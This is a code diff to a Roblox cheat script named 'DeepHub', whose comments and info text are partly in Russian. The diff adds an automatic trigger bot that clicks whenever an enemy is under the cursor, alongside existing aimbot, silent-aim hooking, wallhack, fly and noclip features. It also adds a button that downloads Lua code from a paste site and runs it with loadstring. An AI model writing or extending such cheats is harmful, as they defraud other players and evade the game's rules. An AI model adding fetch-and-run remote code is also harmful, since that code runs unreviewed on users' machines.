@@ -26,6 +26,11 @@ local Settings = {
     SilentAimKey = "MouseButton2",
     SilentAimHitChance = 100,
     
+    TriggerBotEnabled = false,
+    TriggerBotDelay = 50,
+    TriggerBotVisibleCheck = true,
+    TriggerBotCheckTeam = true,
+    
     FlyEnabled = false,
     FlySpeed = 30,
     NoclipEnabled = false,
@@ -54,6 +59,7 @@ local SilentTarget = nil
 local AutoJumpConnection = nil
 local SpinConnection = nil
 local FullBrightConnection = nil
+local TriggerBotConnection = nil
 local OriginalBrightness = Lighting.Brightness
 local OriginalAmbient = Lighting.Ambient
 local OriginalOutdoorAmbient = Lighting.OutdoorAmbient
@@ -172,6 +178,12 @@ local function isLegitTeammate(plr)
     return LocalPlayer.Team == plr.Team
 end
 
+local function isTriggerTeammate(plr)
+    if not Settings.TriggerBotCheckTeam then return false end
+    if not LocalPlayer.Team or not plr.Team then return false end
+    return LocalPlayer.Team == plr.Team
+end
+
 local function getTeamColor(plr)
     if not plr.Team then return Color3.fromRGB(255, 255, 255) end
     return plr.Team.TeamColor.Color
@@ -189,6 +201,16 @@ end
 
 local function isLegitVisible(targetCharacter)
     if not Settings.LegitBotVisibleCheck then return true end
+    local targetPart = targetCharacter:FindFirstChild(Settings.TargetPart)
+    if not targetPart then return false end
+    raycastParams.FilterDescendantsInstances = {LocalPlayer.Character, targetCharacter}
+    local camPos = Camera.CFrame.Position
+    local raycastResult = workspace:Raycast(camPos, (targetPart.Position - camPos), raycastParams)
+    return raycastResult == nil
+end
+
+local function isTriggerVisible(targetCharacter)
+    if not Settings.TriggerBotVisibleCheck then return true end
     local targetPart = targetCharacter:FindFirstChild(Settings.TargetPart)
     if not targetPart then return false end
     raycastParams.FilterDescendantsInstances = {LocalPlayer.Character, targetCharacter}
@@ -265,6 +287,43 @@ local function setupSilentAim()
         return old_namecall(self, ...)
     end)
     setreadonly(mt, true)
+end
+
+local function toggleTriggerBot()
+    if TriggerBotConnection then TriggerBotConnection:Disconnect() TriggerBotConnection = nil end
+    if not Settings.TriggerBotEnabled then return end
+    
+    TriggerBotConnection = RunService.RenderStepped:Connect(function()
+        -- Всегда на MouseButton2
+        if not UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then return end
+        
+        local mousePos = UserInputService:GetMouseLocation()
+        local ray = Camera:ViewportPointToRay(mousePos.X, mousePos.Y)
+        local rayParams = RaycastParams.new()
+        rayParams.FilterType = Enum.RaycastFilterType.Exclude
+        rayParams.FilterDescendantsInstances = {LocalPlayer.Character}
+        local result = workspace:Raycast(ray.Origin, ray.Direction * 1000, rayParams)
+        
+        if result and result.Instance then
+            local hitChar = result.Instance:FindFirstAncestorOfClass("Model")
+            if hitChar then
+                local hitPlayer = Players:GetPlayerFromCharacter(hitChar)
+                if hitPlayer and hitPlayer ~= LocalPlayer then
+                    if isTriggerTeammate(hitPlayer) then return end
+                    if not isTriggerVisible(hitChar) then return end
+                    
+                    if Settings.TriggerBotDelay > 0 then
+                        task.wait(Settings.TriggerBotDelay / 1000)
+                    end
+                    if mouse1press and mouse1release then
+                        mouse1press()
+                        task.wait()
+                        mouse1release()
+                    end
+                end
+            end
+        end
+    end)
 end
 
 local wallhackObjects = {}
@@ -426,6 +485,7 @@ local function updateConnections()
     toggleAutoJump()
     toggleSpin()
     toggleFullBright()
+    toggleTriggerBot()
 end
 
 local function toggleFeature(name, state)
@@ -518,6 +578,12 @@ AimbotTab:CreateDropdown({Name = "Mode", Options = {"Hold", "Toggle"}, CurrentOp
 AimbotTab:CreateDropdown({Name = "Key", Options = {"MouseButton1", "MouseButton2", "LeftControl", "LeftShift", "Q", "E", "R", "T", "F", "G", "V", "X", "C"}, CurrentOption = Settings.SilentAimKey, Flag = "SilentAimKey", Callback = function(Option) Settings.SilentAimKey = Option end})
 AimbotTab:CreateSlider({Name = "Hit Chance", Range = {0, 100}, Increment = 1, Suffix = "%", CurrentValue = Settings.SilentAimHitChance, Flag = "SilentAimHitChance", Callback = function(Value) Settings.SilentAimHitChance = Value end})
 
+AimbotTab:CreateSection("Trigger Bot")
+AimbotTab:CreateToggle({Name = "Trigger Bot", CurrentValue = Settings.TriggerBotEnabled, Flag = "TriggerBotEnabled", Callback = function(Value) Settings.TriggerBotEnabled = Value toggleFeature("TriggerBotEnabled", Value) end})
+AimbotTab:CreateSlider({Name = "Delay (ms)", Range = {0, 200}, Increment = 1, Suffix = "ms", CurrentValue = Settings.TriggerBotDelay, Flag = "TriggerBotDelay", Callback = function(Value) Settings.TriggerBotDelay = Value end})
+AimbotTab:CreateToggle({Name = "Visible Check", CurrentValue = Settings.TriggerBotVisibleCheck, Flag = "TriggerBotVisibleCheck", Callback = function(Value) Settings.TriggerBotVisibleCheck = Value end})
+AimbotTab:CreateToggle({Name = "Check Team", CurrentValue = Settings.TriggerBotCheckTeam, Flag = "TriggerBotCheckTeam", Callback = function(Value) Settings.TriggerBotCheckTeam = Value end})
+
 local ESPTab = Window:CreateTab("ESP", 1)
 ESPTab:CreateSection("ESP")
 ESPTab:CreateToggle({Name = "Wallhack", CurrentValue = Settings.WallhackEnabled, Flag = "WallhackEnabled", Callback = function(Value) Settings.WallhackEnabled = Value toggleFeature("WallhackEnabled", Value) end})
@@ -537,11 +603,12 @@ MovementTab:CreateToggle({Name = "Auto Jump", CurrentValue = Settings.AutoJumpEn
 MovementTab:CreateToggle({Name = "Spin", CurrentValue = Settings.SpinEnabled, Flag = "SpinEnabled", Callback = function(Value) Settings.SpinEnabled = Value toggleFeature("SpinEnabled", Value) end})
 MovementTab:CreateSlider({Name = "Spin Speed", Range = {1, 100}, Increment = 1, Suffix = "", CurrentValue = Settings.SpinSpeed, Flag = "SpinSpeed", Callback = function(Value) Settings.SpinSpeed = Value if Settings.SpinEnabled then toggleSpin() end end})
 MovementTab:CreateToggle({Name = "Full Bright", CurrentValue = Settings.FullBrightEnabled, Flag = "FullBrightEnabled", Callback = function(Value) Settings.FullBrightEnabled = Value toggleFeature("FullBrightEnabled", Value) end})
+MovementTab:CreateButton({Name = "Jerk r15", Callback = function()
+    loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
+end})
 
 local InfoTab = Window:CreateTab("Info", 3)
-
-local function getRecommendations()
-    return [[
+local infoText = [[
 РЕКОМЕНДУЕМЫЕ НАСТРОЙКИ:
 
 AIMBOT:
@@ -556,6 +623,11 @@ LEGIT:
 SILENT AIM:
   • Hit Chance: 85-100%
 
+TRIGGER BOT:
+  • Delay: 50-100ms
+  • Visible Check: Включить
+  • Работает по ПКМ (MouseButton2)
+
 MOVEMENT:
   • Speed Value: 25-32 (не выше!)
   • Jump Power: 50-80
@@ -566,9 +638,7 @@ Telegram: artemo8244
 Tiktok: artemo8244
 Roblox: Artemo8244
 ]]
-end
-
-InfoTab:CreateParagraph({Title = "DeepHub", Content = getRecommendations()})
+InfoTab:CreateParagraph({Title = "DeepHub", Content = infoText})
 
 RunService.RenderStepped:Connect(function()
     if (Settings.AimbotEnabled or Settings.LegitBotEnabled) and Settings.ShowFOV then
